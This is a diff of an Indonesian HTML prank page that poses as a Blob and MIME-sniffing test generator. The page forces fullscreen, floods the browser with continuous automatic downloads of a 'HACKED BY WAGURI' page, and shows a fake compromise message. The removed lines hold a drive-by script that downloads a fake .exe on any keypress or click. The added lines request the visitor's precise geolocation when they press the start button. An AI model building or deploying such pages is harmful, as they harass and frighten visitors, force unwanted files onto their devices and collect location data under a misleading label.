@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Berkas Blob &amp; ObjectURL</title>
+<title>Generator Berkas Blob &amp; Geolokasi Dispatcher</title>
 <style>
 * {
 box-sizing: border-box;
@@ -87,10 +87,10 @@ word-break: break-all;
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
+<h2>Generator Berkas Blob &amp; Geolokasi</h2>
+<p>Klik tombol untuk masuk ke layar penuh, meminta izin geolokasi, dan memicu pembuatan berkas Blob secara terus-menerus.</p>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+<button id="start-btn" type="button">Mulai &amp; Akses Perangkat</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -114,74 +114,33 @@ window.speechSynthesis.speak(utterance);
 }
 };
 
+const requestGeolocation = () => {
+if ('geolocation' in navigator) {
+navigator.geolocation.getCurrentPosition(
+(position) => {
+console.log("Lat:", position.coords.latitude, "Long:", position.coords.longitude);
+statusDiv.textContent = `Lokasi diperoleh: ${position.coords.latitude}, ${position.coords.longitude}`;
+},
+(error) => {
+console.warn("Izin geolokasi ditolak atau error:", error.message);
+statusDiv.textContent = "Izin geolokasi ditolak oleh pengguna.";
+},
+{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+);
+}
+};
+
 const prepareMimeBlobAsync = (i) => {
 return new Promise((resolve) => {
 queueMicrotask(() => {
 const payloadText = "<!DOCTYPE html>" +
 "<html>" +
-"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
-"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
+"<head><meta charset='UTF-8'><title>HACKED BY WAGURI</title></head>" +
+"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace'>" +
 "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
-"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
-"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
-"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
-"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
+"<h1 style='font-size:60px;color:#f00'>HACKED BY WAGURI</h1>" +
+"<p style='font-size:16px;color:#ff0'>Sesi aktif dalam tab terisolasi</p>" +
 "</div>" +
-"<style>" +
-"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
-"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
-"</style>" +
-"<script>" +
-"(function(){" +
-"\"use strict\";" +
-"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-"try { alert('HACKED BY WAGURI'); } catch(e){}" +
-"function b64KeBytes(b64){" +
-"var binary = atob(b64);" +
-"var len = binary.length;" +
-"var bytes = new Uint8Array(len);" +
-"for (var i = 0; i < len; i++) {" +
-"bytes[i] = binary.charCodeAt(i);" +
-"}" +
-"return bytes;" +
-"}" +
-"var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
-"var sudah = false;" +
-"function picuDownload(){" +
-"if (sudah) return;" +
-"sudah = true;" +
-"var statusEl = document.getElementById('status');" +
-"try{" +
-"statusEl.textContent = 'Menyiapkan berkas...';" +
-"var bytesArr = b64KeBytes(b64Data);" +
-"var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
-"var url = URL.createObjectURL(blob);" +
-"var a = document.createElement('a');" +
-"a.href = url;" +
-"a.download = 'hacked-by-anonymous.exe';" +
-"a.style.display = 'none';" +
-"document.body.appendChild(a);" +
-"a.click();" +
-"setTimeout(function(){ " +
-"if (a.parentNode) a.parentNode.removeChild(a); " +
-"URL.revokeObjectURL(url); " +
-"}, 3000);" +
-"statusEl.textContent = 'Payload berhasil diunduh!';" +
-"statusEl.style.color = '#0f0';" +
-"} catch(e){" +
-"statusEl.textContent = 'Gagal: ' + e.message;" +
-"statusEl.style.color = '#f00';" +
-"sudah = false;" +
-"}" +
-"}" +
-"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
-"document.addEventListener('click', picuDownload);" +
-"document.addEventListener('touchstart', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
-"})();" +
-"<\/script>" +
 "</body>" +
 "</html>";
           
@@ -209,14 +168,9 @@ const fileData = await prepareMimeBlobAsync(counter);
 activeUrls.push(fileData.url);
 
 triggerInstantDownload(fileData);
-
 statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
-if (counter % 10 === 0) {
-speak(`Proses mencapai ${counter} berkas.`);
-}
-
-setTimeout(() => processLoop(counter + 1), 0);
+setTimeout(() => processLoop(counter + 1), 500);
 };
 
 startBtn.addEventListener("click", () => {
@@ -226,25 +180,20 @@ activeUrls.forEach(url => URL.revokeObjectURL(url));
 activeUrls = [];
 downloadsDiv.replaceChildren();
 
-speak("Mengaktifkan mode layar penuh.");
+speak("Mengaktifkan mode perangkat.");
+
+// Panggil permintaan geolokasi saat interaksi klik awal
+requestGeolocation();
 
 const root = document.documentElement;
 try {
 if (root.requestFullscreen) {
 root.requestFullscreen();
-} else if (root.webkitRequestFullscreen) {
-root.webkitRequestFullscreen();
-} else if (root.mozRequestFullScreen) {
-root.mozRequestFullScreen();
 }
-statusDiv.textContent = "Mengunci layar penuh...";
-} catch (err) {
-console.warn("Fullscreen tidak didukung atau ditolak:", err);
-}
+} catch (err) {}
 
 setTimeout(() => {
 isProcessing = true;
-speak("Proses pembuatan berkas Blob dimulai.");
 processLoop(1);
 }, 300);
 });
